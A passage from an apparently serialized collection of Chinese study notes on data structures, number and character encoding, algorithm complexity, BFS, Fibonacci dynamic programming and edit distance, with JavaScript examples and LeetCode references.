，如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/3bea47250c1ae6402c1c25bc35f11b05.png)\n\n> 注意上图中的 `节点指针` 与 `节点值`\n\n**所有数据结构都是基于数组、链表或二者的组合实现的**\n\n> - 基于`数组`可实现 ：栈、队列、哈希表、树、堆、图、矩阵、张量（维度的数组）等\n> - 基于`链表`可实现 ：栈、队列、哈希表、树、堆、图等。\n\n按照数据结构在初始化后，是否可对其长度进行调整，又可以分为：\n\n- **静态数据结构**，即 基于数组实现的数据结构\n- **动态数据结构**，即 基于链表实现的数据结构\n\n## 二、基本数据类型\n\n**基本数据类型**提供了数据的 **内容类型**，而 **数据结构** 提供了数据的 **组织方式**，如：\n\n```javascript\n// JavaScript 的数组数据结构 可以自由存储各种 【基本数据类型】 和 对象\nconst array = [0, 0.0, 'a', false];\n```\n\n**基本数据类型是 CPU 可以直接进行运算的类型，在算法中直接被使用**，下表列举了`**各种基本数据类型**`** **的占用空间、取值范围和默认值\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/c85e009fb908c7eb08587ad9e1633918.png)\n\n> 1、现代计算机 CPU  通常将 `1 字节`作为  `最小寻址内存单元`。因此，即使表示`布尔量`仅需 1 位（0 或 1 ）， 它在内存中通常被存储为 1 字节。\n>  \n> 2、`1 bytes = 8 bits` , 可以表示 `2^8` 个不同的数字\n\n## 三、数字编码\n\n> `1 byte` 的取值范围是 `[-128,127]` 为什么不是 `[-128,128]`？ 它 内在原因涉及到**原码、反码、补码**的相关知识\n\n### （一）原码、反码、补码\n\n- 原码： \n   - **最高位**：视为`符号位`，其中 `0` 表示正数，`1` 表示负数\n   - **其余位**：表示数字的\n- 反码： \n   - `**正数**`** **的反码与其原码相同\n   - `**负数**`** **的反码是对其原码除符号位外的所有位取反。\n- 补码： \n   - `**正数**`的补码与其原码相同\n   - `**负数**`的补码是在其反码的基础上加 `1`\n\n以上总结就是，如下图：\n\n- 正数的原码、反码、补码相同\n- 负数的原码、反码、补码需要转化 \n   - 反码：除符号位外的所有位`取反`\n   - 补码：反码的基础上加 `1`\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/7a428419ec7a8b880d1accde153d13cc.png)\n\n**原码** 最直观，但数字以**补码**存到计算机中，为什么呢？这是因为**原码的 2 个局限性**\n\n1、 `负数的原码`不能直接用于运算，如 `1 + (-2)` 不应该等于 `-1` 吗 ？但使用原码计算为 `-3`\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/89d0d312c18f68ae9e728e99449a621e.png)\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/23e1a2b5c9cabedd0cba022864901f61.png)\n\n2、数字`零` 的原码有 `+0` 和 `-0` 两种表示方式 ， 即 **正 0 和 负 0 的原码不同，但补码相同**\n\n### （二）为什么是 `[-128,127]` ，128 的特殊性\n\n这里，再来回答 `1 byte` 的取值范围是 `[-128,127]`  为什么不是 `[-127,127]`？\n\n因为， `[-127,127]` 区间内，所有整数的源码，反码、及补码都可以相互转化，但是 `-128` 的补码是 `1000 0000`  ，与 `+0` 的补码相同，所以计算机规定 **补码1000 0000 没有原码，它代表 -128**\n\n总之，`-128`的补码比较特殊，和 `+0` 冲突了，计算机做特殊处理。\n\n### （三）计算机所有运算都是加法\n\n**计算机内部的硬件电路主要是基于加法运算设计的**。这是因为加法运算相对于其他运算（比如乘法、除法和减法）来说，硬件实现起来更简单，更容易进行并行化处理，从而提高运算速度；如：\n\n- 减法：如  `a - b` 其实就是 `a + (-b)`\n- 乘法和除法：可以转换为计算多次加法或减法\n\n### （四）计算机使用补码的原因\n\n我们可以总结出**计算机使用补码的原因**：基于补码表示，计算机可以用同样的**电路**和操作来处理正数和负数的加法，不需要设计特殊的硬件电路来处理减法，并且无需特别处理正负零的歧义问题。这大大简化了硬件设计，并提高了运算效率。\n\n### （五）浮点数编码：float 与 double\n\n一个违反直觉的事情：`int` 和 `float` 长度相同，都是 `4 bytes`，但 **为什么 float 的取值范围远大于 int ？** 这非常反直觉，因为按理说 float 需要表示小数，取值范围应该变小才对\n\n简单来说就是，`float` 采用了不同的表示方式。如下\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/8848b451c9932afb71fb6d460b7d6d76.png)\n\n具体的不必展开了，真有需要可以参考 [https://www.hello-algo.com/chapter_data_structure/number_encoding/#332](https://www.hello-algo.com/chapter_data_structure/number_encoding/#332)\n\n> [!info]\n1、尽管浮点数 `float` 扩展了取值范围，但其副作用是牺牲了精度\n2、双精度 `double` 也采用类似 `float` 的表示方法，具体的需要再去查吧，这里点到即可\n\n## 四、字符编码\n\n### （一）ASCII 字符集\n\n「ASCII 码」是最早出现的字符集，全称为“美国标准信息交换代码” ，采用 **7 位二进制** ，所以最多能够表示 **128 个不同的字符** ，如下图\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/8163e2b24c6b4bc277ee3211f8ad877c.png)\n\n### （二）GBK 字符集\n\n- 汉字大约有近十万个\n- `GB2312` 无法处理部分的罕见字和繁体字，所以扩展得到了 **GBK 字符集**\n- ASCII 字符使用`一个字节`表示，汉字使用`两个字节`表示。\n\n### （三）Unicode 字符集、UTF-8/16/32 编码\n\n#### 1、为何需要 Unicode 字符集？\n\n如果推出一个足够完整的字符集，**将世界范围内的所有语言和符号都收录其中**，不就可以解决跨语言环境和乱码问题了吗？\n\n#### 2、UTF-8/16/32 编码\n\n- UTF-8 已成为国际上使用最广泛的 `Unicode 编码方法`。它是一种**可变长**的编码\n- 除了 `UTF-8` 之外，常见的编码方式还包括 `UTF-16` 和 `UTF-32`\n- `UTF-16` 编码：使用 2 或 4 个字节来表示一个字符\n- `UTF-32` 编码：每个字符都使用 4 个字节\n- 从**存储空间**的角度看 \n   - 使用 `UTF-8` 表示英文字符非常高效，因为它仅需 1 个字节\n   - 使用 `UTF-16` 编码某些非英文字符（例如中文）会更加高效，因为它只需要 2 个字节，而 UTF-8 可能需要 3 个字节\n- 从**兼容性**的角度看，`UTF-8` 的通用性最佳，所以许多工具和库都优先支持 `UTF-8`\n\n#### 3、各语言使用的编码情况\n\n- Java 的 `String 类型`使用 `UTF-16 编码`，每个字符占用 2 字节\n- JavaScript 和 TypeScript 的字符串使用 `UTF-16 编码`的原因与 Java 类似\n- C# 使用 `UTF-16 编码`\n- Python 3 使用一种灵活的字符串表示 ， 如 对于全部是 ASCII 字符的字符串，每个字符占用 1 个字节\n- Go 语言的 string 类型在内部使用 UTF-8 编码。Go 语言还提供了 rune 类型，它用于表示单个 Unicode 码点。\n- Rust 语言的 str 和 String 类型在内部使用 UTF-8 编码，Rust 也提供了 char 类型，用于表示单个 Unicode 码点。\n\n#### 4、文件存储或网络传输场景中\n\n**字符串在编程语言中的存储方式  和  在文件中存储或在网络中传输  是两个不同的问题**。在文件存储或网络传输中，我们一般会将字符串编码为 UTF-8 格式，以达到最优的兼容性和空间效率。\n\n## 最后：QA\n\n**1、为什么哈希表同时包含线性数据结构和非线性数据结构？**\n\n哈希表可能同时包含线性（数组、链表）和非线性（树）数据结构，比如 拉链法？\n\n**2、char 类型的长度是 1 byte 吗？**\n\n跟具体编程语言有关，比如 Java, JS, TS, C# 都采用 UTF-16 编码（保存 Unicode 码点），因此 char 类型的长度为 2 bytes 。\n\n**3、为什么出现了不同的编码字符编码，比如 ascii utf8/16/32 等 ？**\n\n`能表示更多字符`  和 `存储成本` 的 平衡；\n\n**4、如何 UTF-8 是一种可变长的编码？**  见下图：\n\n- 对于长度为 `1字节`的字符，将最高位设置为 0  、其余 7 位设置为 **Unicode 码点**，即**向下兼容了 ascii 码**\n- 剩余的对于长度为 `n字节`的字符，如下：\n- 所以说 Unicode 是一种字符集标准，本质上是给每个字符分配一个编号（称为“码点”），但  **它并没有规定在计算机中如何存储这些字符码点**\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/a643995d558c19d0971dce7138e4d274.png)\n\n**5、UTF-32 编码：每个字符都使用 4 个字节，虽然占空间，但很好理解，如下图**\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/196bc7de47e9a0e2ad3f88f18f68e88c.png)\n\n> 上图只是表达这种编码方式都有 等长字节\n\n## 参考\n\n- [https://www.hello-algo.com/chapter_data_structure/](https://www.hello-algo.com/chapter_data_structure/)\n","PAvaURHF":"\n# 算法复杂度\n\n\n`#2023/07/27`  `#算法/基础`\n\n> [!info]\n> - 空间复杂度的计算的方式可以再读读，挺有意思\n\n\n## 目录\n<!-- toc -->\n ## 一、综述 \n\n1. 数据结构和算法解决是  “如何让计算机更快时间、更省空间的解决问题”。\n2. 因此需从`执行时间`和`占用空间`两个维度来评估数据结构和算法的性能。\n3. 分别用`时间复杂度`和 `空间复杂度` 两个概念来描述性能问题，二者统称为`复杂度`。\n4. 复杂度描述的是算法`执行时间`（或`占用空间`）与 `数据规模`的  `增长趋势` 关系。\n\n## 二、时间复杂度\n\n### （一）什么是时间复杂度\n统计的是 算法运行时间随着数据量变大时的  `增长趋势` ，而不是 `具体运行时间`\n下面函数展示了随着 `n` 的增加，算法的 `时间的复杂度`\n```javascript\n// 算法 A 时间复杂度：常数阶\nfunction algorithm_A(n) {\n    console.log(0);\n}\n// 算法 B 时间复杂度：线性阶\nfunction algorithm_B(n) {\n    for (let i = 0; i < n; i++) {\n        console.log(0);\n    }\n}\n// 算法 C 时间复杂度：常数阶\nfunction algorithm_C(n) {\n    for (let i = 0; i < 1000000; i++) {\n        console.log(0);\n    }\n}\n```\n上面代码的的**增长趋势**如下图：\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/ea5f6229f7163afc408a23aef0728791.png)\n时间复杂度由多项式 `T(n)` 中最高阶的项来决定。这是因为在趋于无穷大时，最高阶的项将发挥主导作用，其他项的影响都可以被忽略。即 **“系数无法撼动阶数”** ， 当趋于无穷大时，这些常数变得无足轻重，如下图：\n![|337](https://832-1310531898.cos.ap-beijing.myqcloud.com/dfa3c541c8fde0817d043413d5a96f39.png)\n\n### （二）如何计算时间复杂度\n```javascript\nfunction aFun() {\n    console.log(\"Hello, World!\");      //  需要执行 1 次\n    return 0;       // 需要执行 1 次\n}\n\n// 需要执行 2 次运算\nfunction bFun(n) {\n    for(let i = 0; i < n; i++) {         // 需要执行 (n + 1) 次\n        console.log(\"Hello, World!\");      // 需要执行 n 次\n    }\n    return 0;       // 需要执行 1 次\n}\n// 需要执行 ( n + 1 + n + 1 ) = 2n +2 次运算\n\n function cal(n) {\n   let sum = 0; // 1 次\n   let i = 1; // 1 次\n   let j = 1; // 1 次\n   for (; i <= n; ++i) {  // n 次\n     j = 1;  // n 次\n     for (; j <= n; ++j) {  // n * n ，也即是  n平方次\n       sum = sum +  i * j;  // n * n ，也即是  n平方次\n     }\n   }\n }\n// 那么这个方法需要执行 ( n^2 + n^2 + n + n + 1 + 1 +1 ) = 2n^2 +2n + 3\n```\n如下图：\n![|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/4e79ed2e30c215179f648fdd5000f363.png)\n\n### （三）几个时间复杂度的分析原则\n\n- 只关注 `循环执行次数最多`的一段代码，即 **“系数无法撼动阶数”**\n- 加法法则：总复杂度  等于  **量级最大** 的那段代码的复杂度\n- 乘法法则：嵌套代码的复杂度等于 **嵌套内外代码复杂度的乘积**\n- 多个规模求加法：`O(m+n)`\n- 多个规模求乘法：`O(m*n)`\n\n### （四）常见的算法时间复杂度\n\n#### 1、常数阶：O(1)\n```javascript\n/* 常数阶 */\nfunction constant(n) {\n    let count = 0;\n    const size = 100000; // size 是固定的\n    for (let i = 0; i < size; i++) count++;\n    return count;\n}\n```\n\n#### 2、线性阶：O(n)\n通常出现在单层循环中，`遍历数组和遍历链表`等操作的时间复杂度均为 `O(n)`\n\n#### 3、平方阶：O(n^2)\n通常出现在 `嵌套循环` 中，如冒泡排序。\n> [!info]\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/88cb8b3a7d878706742e70be0d6f2b23.png)\n\n#### 4、指数阶：O(2^n)\n\n- 实际场景，**细胞分裂**：初始状态为 `1` 个细胞，分裂一轮后变为 `2` 个，分裂`两轮`后变个`4` 细胞 ...\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/ac00b7799791dc9505590961d2bbb4bb.png)\n\n- `指数阶`常出现于`递归函数` 中，如下代码：\n```javascript\n/* 指数阶（递归实现） */\nfunction expRecur(n) {\n    if (n == 1) return 1;\n    return expRecur(n - 1) + expRecur(n - 1) + 1;\n}\n```\n\n#### 5、对数阶：O(log n)\n\n- 与`指数阶`相反，对数阶反映了  **“每轮缩减到一半的情况”**\n- 常出于「二分查找」和「分治算法」中\n- `每轮缩减到一半`的代码示例及图例如下：\n```javascript\n/* 对数阶（循环实现） */\nfunction logarithmic(n) {\n    let count = 0;\n    while (n > 1) {\n        n = n / 2;\n        count++;\n    }\n    return count;\n}\n```\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/3ff8899588e1ffa4f4b94073eabdef94.png)\n\n- 与 `指数阶` 一样，对数阶也常出于 `递归函数` 中，如下代码\n```javascript\n/* 对数阶（递归实现） */\nfunction logRecur(n) {\n    if (n <= 1) return 0;\n    return logRecur(n / 2) + 1;\n}\n```\n\n#### 6、线性对数阶：`O(n*log n)`\n\n如主流排序算法 快速排序、归并排序、堆排序等\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/27ec8375a419fee15f4b37ce2a8cc49f.png)\n\n#### 7、阶乘阶：O(n!)\n即 `「全排列」` 问题\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/ae31393acb0b846e96cc6e127721d0d1.png)\n> [!question]\n画出一张 `阶乘阶` 的 分裂图？\n\n### （五）最差、最佳、平均时间复杂度\n\n- `「最差时间复杂度」`更为实用，因为它给出了一个 **“效率安全值”**\n- 至于其他，如 `平均情况时间复杂度`  等忽略吧\n\n## 三、空间复杂度\n「空间复杂度 Space Complexity」用于衡量算法使用**内存空间随着数据量变大时的增长趋势**\n\n### （一）算法相关 `空间`\n\n- **「输入空间」** 用于存储算法的输入数据。\n- **「暂存空间」** 用于存储算法运行过程中的变量、对象、函数上下文等数据。\n   - 「暂存数据」用于保存算法运行过程中的各种常量、变量、对象等。\n   - 「栈帧空间」用于保存调用函数的上下文数据。\n      - 系统在每次调用函数时都会在栈顶部`创建`一个栈帧，\n      - 函数返回后，栈帧空间会被`释放`。\n   - 「指令空间」用于保存编译后的程序指令，在实际统计中`通常忽略不计`。\n- **「输出空间」** 用于存储算法的输出数据。\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/4c8a91efffc89dcd586e114161a7ea49.png)\n```javascript\n/* 类 */\nclass Node {\n    val;\n    next;\n    constructor(val) {\n        this.val = val === undefined ? 0 : val; // 节点值\n        this.next = null;                       // 指向下一节点的引用\n    }\n}\n\n/* 函数 */\nfunction constFunc() {\n    // do something\n    return 0;\n}\n\nfunction algorithm(n) {       // 输入数据: 输入空间，即函数\n    const a = 0;              // 暂存数据（常量）\n    let b = 0;                // 暂存数据（变量）\n    const node = new Node(0); // 暂存数据（对象）\n    const c = constFunc();    // 栈帧空间（调用函数）\n    return a + b + c;         // 输出数据：返回数据，即 return\n}\n\n```\n\n### （二）如何推算空间复杂度\n通常只关注 `最差空间复杂度` , 看下面代码就懂了，因为我们必须要有 足够的内存空间预留，所以：\n\n- 以`最差`输入数据为准\n- 以算法运行过程中的`峰值内存`为准\n```javascript\nfunction algorithm(n) {\n    const a = 0;                   // O(1)\n    const b = new Array(10000);    // O(1)\n    if (n > 10) {\n        const nums = new Array(n); // O(n)\n    }\n}\n```\n以下代码的空间复杂度分析：\n```javascript\nfunction constFunc() {\n    // do something\n    return 0;\n}\n/* 循环 O(1) */\n// 因为每轮循环后，调用的函数都会 释放了栈帧空间，所以空间复杂度为 O(1)\nfunction loop(n) {\n    for (let i = 0; i < n; i++) {\n        constFunc();\n    }\n}\n/* 递归 O(n) */\n// 递归函数 recur() 在运行过程中会同时存在 个未返回的 recur()\n// 所以，会有 O(n) 的栈帧空间\nfunction recur(n) {\n    if (n === 1) return;\n    return recur(n - 1);\n}\n\n```\n\n### （三）常见的空间复杂度类型\n\n#### 1、常数阶：O(1)\n常数阶常见于 **数量与输入数据大小 n 无关的常量、变量、对象**\n```javascript\n/* 常数阶 */\nfunction constant(n) {\n    // 常量、变量、对象占用 O(1) 空间\n    const a = 0;\n    const b = 0;\n    const nums = new Array(10000);\n    const node = new ListNode(0);\n    // 循环中的变量占用 O(1) 空间\n    for (let i = 0; i < n; i++) {\n        const c = 0;\n    }\n    // 循环中的函数占用 O(1) 空间\n    for (let i = 0; i < n; i++) {\n        constFunc();\n    }\n}\n```\n> [!tip]\n需要注意的是，在循环中初始化变量或调用函数而占用的内存，在进入下一循环后就会被释放，即不会累积占用空间，空间复杂度仍为`O(1)`\n\n#### 2、线性阶：O(n)\n线性阶常见于 **元素数量与 输入数据大小 **`n`** 成正比的数组、链表、栈、队列等。**\n```javascript\n/* 线性阶 */\nfunction linear(n) {\n    // 长度为 n 的数组占用 O(n) 空间\n    const nums = new Array(n);\n    // 长度为 n 的列表占用 O(n) 空间\n    const nodes = [];\n    for (let i = 0; i < n; i++) {\n        nodes.push(new ListNode(i));\n    }\n    // 长度为 n 的哈希表占用 O(n) 空间\n    const map = new Map();\n    for (let i = 0; i < n; i++) {\n        map.set(i, i.toString());\n    }\n}\n```\n\n以下递归函数会同时存在 `n` 个未返回的 `algorithm()` 函数， 会占用 `O(n)`大小的栈帧空间：\n```javascript\n/* 线性阶（递归实现） */\nfunction linearRecur(n) {\n    console.log(`递归 n = ${n}`);\n    if (n === 1) return;\n    linearRecur(n - 1);\n}\n```\n如下图：\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/dfe9b1eb0d0a84c7053f69f794a367b6.png)\n\n#### 3、平方阶：O(n^2)\n平方阶常见于**矩阵 和 图** ，如下代码：\n```javascript\n/* 平方阶 */\nfunction quadratic(n) {\n    // 矩阵占用 O(n^2) 空间\n    const numMatrix = Array(n)\n        .fill(null)\n        .map(() => Array(n).fill(null));\n\n    // 二维列表占用 O(n^2) 空间\n    const numList = [];\n    for (let i = 0; i < n; i++) {\n        const tmp = [];\n        for (let j = 0; j < n; j++) {\n            tmp.push(0);\n        }\n        numList.push(tmp);\n    }\n}\n```\n看看递归的场景：注意，需要关注 `nums` 的长度。\n```javascript\n/* 平方阶（递归实现） */\nfunction quadraticRecur(n) {\n    if (n <= 0) return 0;\n    const nums = new Array(n);\n    console.log(`递归 n = ${n} 中的 nums 长度 = ${nums.length}`);\n    return quadraticRecur(n - 1);\n}\n\n```\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/f6b5154844af6165acfa600c31d34e64.png)\n\n#### 4、指数阶：O(2^n)\n常见与构造二叉树，且关注最终的 `节点个数`，即占用的空间。\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/5147e79065e5fab121c166b6a62a25ac.png)\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/4f6e32f2f25b2223ae034964af127da9.png)\n\n#### 5、对数阶：O(log n)\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/1061ba6d1caec553eef45ce34c47290b.png)\n> [!question]\n 最后，数字转成字符串的表述，其实没太理解。\n\n## 四、其他\n\n- 理论上，尾递归函数的空间复杂度可以被优化为 `O(1)` ，但跟编程语言有关系\n- 当前的计算机系统，以空间换时间场景较多\n\n## 参考\n\n[https://www.hello-algo.com/chapter_computational_complexity/time_complexity/#222](https://www.hello-algo.com/chapter_computational_complexity/time_complexity/#222)\n\n","zCZPk3zH":"\n# 前言\n\n\nBFS 算法\n\n目录：\n- ","fj92xPmN":"\n# BFS 算法框架\n\n\n\n## 目录\n<!-- toc -->\n ## BFS 算法框架 \n\nBFS 的核心思想：就是把一些问题抽象成`图`，从一个点开始，向四周开始扩散。一般来说，我们写 BFS 算法都是用「`队列`」这种数据结构，每次将一个节点周围的所有节点加入队列。\n\nBFS 相对 DFS 的最主要的区别是：BFS 找到的路径一定是**最短的**，但代价就是空间复杂度可能比 DFS 大很多\n\n\n```javascript hl:12,14,20\nvar BFS = function (start, target) {\n  // 核心数据结构\n  var q = [];\n  // 避免走回头路\n  var visited = new Set();\n  var step = 0;\n\n  // 将起点加入队列\n  q.push(start);\n  visited.add(start);\n\n  while (q.length > 0) {\n    var sz = q.length;\n    // 将当前队列中的所有节点向四周扩散\n    for (var i = 0; i < sz; i++) {\n      var cur = q.shift();\n      // 划重点：这里判断是否到达终点\n      if (cur == target) return step;\n      // 将 cur 的相邻节点加入队列\n      var adj = cur.adj();\n      for (var j = 0; j < adj.length; j++) {\n        var x = adj[j];\n        if (!visited.has(x)) {\n          q.push(x);\n          visited.add(x);\n        }\n      }\n    }\n    step++;\n  }\n  // 如果走到这里，说明在图中没有找到目标节点\n};\n\n```\n\n## 示例一：二叉树最小深度\n\n> 力扣第 111 题「[二叉树的最小深度](https://leetcode.cn/problems/minimum-depth-of-binary-tree)」\n\n![图片&文件](./files/20241113-7.png)\n\n```javascript\nvar minDepth = function (root) {\n  if (root == null) return 0;\n  let queue = [];\n  queue.push(root);\n  // root 本身就是一层，depth 初始化为 1\n  let depth = 1;\n\n  while (queue.length != 0) {\n    let size = queue.length;\n    // 将当前队列中的所有节点向四周扩散\n    for (let i = 0; i < size; i++) {\n      let cur = queue.shift();\n      // 判断是否到达终点\n      if (cur.left == null && cur.right == null) return depth;\n      // 将 cur 的相邻节点加入队列\n      if (cur.left != null) queue.push(cur.left);\n      if (cur.right != null) queue.push(cur.right);\n    }\n    // 这里增加步数\n    depth++;\n  }\n  return depth;\n};\n```\n\n## 示例二：解开密码最少次数\n\n>  力扣第 752 题「[打开转盘锁](https://leetcode.cn/problems/open-the-lock)」\n\n\n","IMyUF9HJ":"\n# 前言\n\n\n\n- 动态规划\n- 贪心算法\n","jDmwmQfC":"\n# 斐波那契数列\n\n\n`#算法/动态规划` \n\n> 它不是`动态规划问题`，但是对`于理解动态规划`很有帮助！\n\n\n## 目录\n<!-- toc -->\n ## 1. 第 509 题 \n\n| LeetCode                                                                 | 力扣                                                           | 难度  |\n| ------------------------------------------------------------------------ | ------------------------------------------------------------ | --- |\n| [509. Fibonacci Number](https://leetcode.com/problems/fibonacci-number/) | [509. 斐波那契数](https://leetcode.cn/problems/fibonacci-number/) | 🟢  |\n|                                                                          |                                                              |     |\n\n\n![|448](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303181734365.png)\n\n## 2. `自顶向下`的暴力递归解法\n\n```typescript\nvar fib = function (n) {\n  if (n === 0) return 0;\n  if (n === 1) return 1;\n  return fib(n - 1) + fib(n - 2);\n};\n```\n\n算法复杂度，如下图，即`子问题的个数 = O(2^n)`  指数级别，`爆炸`，因为有`重叠子问题` \n\n![图片&文件](./files/20241111.png)\n\n## 3. `自顶向下`的递归解法：带备忘录优化\n\n所谓自顶向下，即 `原问题` 拆解为`子问题` ，`递归`子问题，最终得出`原问题`的答案\n\n```typescript hl:22\n\n// 解决重叠子问题 - 带备忘录的递归解法\nvar fib = function (n) {\n  // 备忘录全初始化为 0\n  let memo = new Array(n + 1).fill(0);\n  // 注意，这里利用了闭包，把memo传入，能够保证不销毁\n  // 进行带备忘录的递归\n  return dp(memo, n);\n};\n// 带着备忘录进行递归\n// 两个参数，传入 memo 数组，添加一个参数\nvar dp = function (memo, n) {\n  // base case\n  if (n === 0 || n === 1) return n;\n  // 已经计算过，不用再计算了\n  if (memo[n] !== 0) return memo[n];\n  // 否则，重新计算，并且存到memo中\n  // 这里利用了闭包，把memo传入\n  memo[n] = dp(memo, n - 1) + dp(memo, n - 2);\n  return memo[n];\n};\n```\n\n算法的时间复杂度，即 `子问题的个数 = O(n)` ， 空间复杂度 `O(n)`\n\n****\n\n**如下图：**\n\n![1000](#)      \n\n## 4. 自低向上的迭代解法： `dp数组`\n\n![|592](https://cdn.nlark.com/yuque/0/2024/png/687303/1709475955927-3df209e7-9318-4f7d-848f-cc79870f904d.png)\n\n```typescript\n/*************************************************\n *</div>:解法3： DP table 【自低向上】dp 数组的迭代（递推）解法\n * //</div>:所谓 【自低向上】 即 推倒过程，从0，1 推倒出 f(2)等\n * 算法的时间复杂度是 O(n) ，空间复杂度O(n)\n ************************************************/\nfunction fib (N) {\n  if (N === 0) return 0;\n  let dp = new Array(N + 1).fill(0);\n  // base case\n  dp[0] = 0;\n  dp[1] = 1;\n  //// 状态转移方程\n  for (let i = 2; i <= N; i++) {\n    dp[i] = dp[i - 1] + dp[i - 2];\n  }\n  return dp[N];\n};\n```\n\n算法的时间复杂度是`O(n)` ，空间复杂度`O(n)`\n\n## 5. 状态转移方程\n\n其实，就是`转态转移方程`的实现，如下：\n\n![图片&文件](./files/20241111-2.png)\n\n## 6. 空间复杂度降为 `O(1)`\n```typescript\n// 进一步优化，把二维的dp table 压成一维的,即只要维护两个变量 prev  curr\nfunction fib (n) {\n  if (n === 0 || n === 1) return n;\n  let prev = 1, curr = 1;\n  \n  for (let i = 2; i < n; i++) {\n    let sum = prev + curr;\n    prev = curr;\n    curr = sum;\n  }\n\n  return curr;\n};\n```\n\n## 7. 最后\n\n1. `dp数组`解法可能进一步压缩空间复杂度，而通过`递归函数解法`不一定能够压缩\n2. 说说 `dp数组` 与 `dp函数` 区别 ？\n\n","nYmTR3Gq":"\n# 子序列：最小编辑距离\n\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n- [https://leetcode.cn/problems/edit-distance/](https://leetcode.cn/problems/edit-distance/)\n\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/121c9f2c19ea847e86dd4ff23298597e.png)\n\n\n## 分析\n\n**解决两个字符串的动态规划问题**，一般都是用两个指针 `i, j` 分别指向两个字符串的`最后`，然后一步步`往前移动`，缩小问题的规模，如下面动动图：\n\n- `s1 = \"rad\"`\n- `s2 = \"apple\"`\n\n把 `s1` 变成 `s2`\n\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/01f8b13eb391c5e181c9625ae00f1ddb.gif)\n\n其实一共 **4 种操作**：\n\n- 啥都别做（`skip`），直接移动 `i` 和 `j` 即可。\n- 插入（`insert`）\n- 删除（`delete`）\n- 替换（`replace`）\n\n**定义 dp 函数**：`dp(s1, i, s2, j)`  ，代表 `s1[0..i]` 和 `s2[0..j]` 的最小编辑距离，即` s1` 变成 `s2` 的 `最短编辑距离`。\n\n> 注意：这里是倒着递归\n\n\n## 自顶向下的递归解法 - 暴力\n\n```javascript\nvar minDistance = function (s1, s2) {\n    var m = s1.length, n = s2.length;\n    // i，j 初始化指向最后一个索引\n    return dp(s1, m - 1, s2, n - 1);\n};\n\n// 定义：返回 s1[0..i] 和 s2[0..j] 的最小编辑距离\nvar dp = function (s1, i, s2, j) {\n    // base case\n    // :::: 即 s1 = '' ,所以 s1 变成 s2 的最小编辑距离就是 s2 的长度,\n    //  即一直插入\n    if (i === -1) return j + 1;\n    // :::: 即 s2 = '' ,所以 s1 变成 s2 的最小编辑距离就是 s1 的长度，\n    //  即一直删除\n    if (j === -1) return i + 1;\n    // skip, 所以 i-1, j-1\n    if (s1[i] === s2[j]) {\n        return dp(s1, i - 1, s2, j - 1);\n    }\n    return Math.min(\n        // 插入, s1[i] 插入到 s2[j] 前面, 所以 j-1\n        dp(s1, i, s2, j - 1) + 1,\n        // 删除，s1[i] 删除，所以 i-1\n        dp(s1, i - 1, s2, j) + 1,\n        // 替换, s2[j] 替换为 s1[i], 所以 i-1, j-1\n        dp(s1, i - 1, s2, j - 1) + 1\n    );\n};\n\nconsole.log(minDistance('horse', 'ros')); // 3\nconsole.log(minDistance('intention', 'execution')); // 5\n```\n\n> [!tip]\n注意看**注释**，另外这里的`状态` 与 `选择` 分别是什么？\n\n> [!tip]\nLeetCode 执行超时！\n\n\n## 自顶向下的递归解法  - 备忘录优化\n\n```javascript\nvar minDistance = function (s1, s2) {\n    var m = s1.length, n = s2.length;\n    const memo = [];\n    for (let i = 0; i < m; i++) {\n        memo[i] = new Array(n).fill(-1);\n    }\n    // i，j 初始化指向最后一个索引\n    return dp(s1, m - 1, s2, n - 1, memo);\n};\n\n// 定义：返回 s1[0..i] 和 s2[0..j] 的最小编辑距离\nvar dp = function (s1, i, s2, j, memo) {\n    // base case\n    // :::: 即 s1 = '' ,所以 s1 变成 s2 的最小编辑距离就是 s2 的长度,\n    //  即一直插入\n    if (i === -1) return j + 1;\n    // :::: 即 s2 = '' ,所以 s1 变成 s2 的最小编辑距离就是 s1 的长度，\n    //  即一直删除\n    if (j === -1) return i + 1;\n    // memo[i][j] 已经计算过\n    if (memo[i][j] !== -1) return memo[i][j];\n    // skip, 所以 i-1, j-1\n    if (s1[i] === s2[j]) {\n        return memo[i][j] = dp(s1, i - 1, s2, j - 1, memo);\n    }\n    return memo[i][j] = Math.min(\n        // 插入, s1[i] 插入到 s2[j] 前面, 所以 j-1\n        dp(s1, i, s2, j - 1, memo) + 1,\n        // 删除，s1[i] 删除，所以 i-1\n        dp(s1, i - 1, s2, j, memo) + 1,\n        // 替换, s2[j] 替换为 s1[i], 所以 i-1, j-1\n        dp(s1, i - 1, s2, j - 1, memo) + 1\n    );\n};\n\nconsole.log(minDistance('horse', 'ros'));\nconsole.log(minDistance('intention', 'execution'));\n\n```\n\n也直接使用`memo={}` 或者 `memo=new Map()`  来优化，避免初始化二维数组，如下代码：\n\n```javascript\nvar minDistance = function (s1, s2) {\n    var m = s1.length, n = s2.length;\n    // 直接使用对象，而不是二维数组\n    const memo = {};\n    // i，j 初始化指向最后一个索引\n    return dp(s1, m - 1, s2, n - 1, memo);\n};\n\n// 定义：返回 s1[0..i] 和 s2[0..j] 的最小编辑距离\nvar dp = function (s1, i, s2, j, memo) {\n    // base case\n    // :::: 即 s1 = 